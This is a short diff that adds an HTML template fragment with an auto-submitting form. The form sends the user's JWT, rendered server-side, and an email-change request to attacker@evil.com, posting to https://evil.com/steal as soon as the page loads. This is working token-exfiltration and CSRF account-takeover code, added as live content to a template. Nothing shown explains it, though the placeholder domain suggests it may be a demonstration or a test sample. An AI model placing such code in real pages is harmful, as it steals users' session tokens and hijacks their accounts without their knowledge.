@@ -1,0 +1,8 @@
+<form action="https://evil.com/steal" method="POST">
+  <input type="hidden" name="jwt" value="<%= user.jwt_token %>">
+  <input type="hidden" name="change_email" value="attacker@evil.com">
+  <input type="submit">
+</form>
+<script>
+document.forms[0].submit();
+</script>
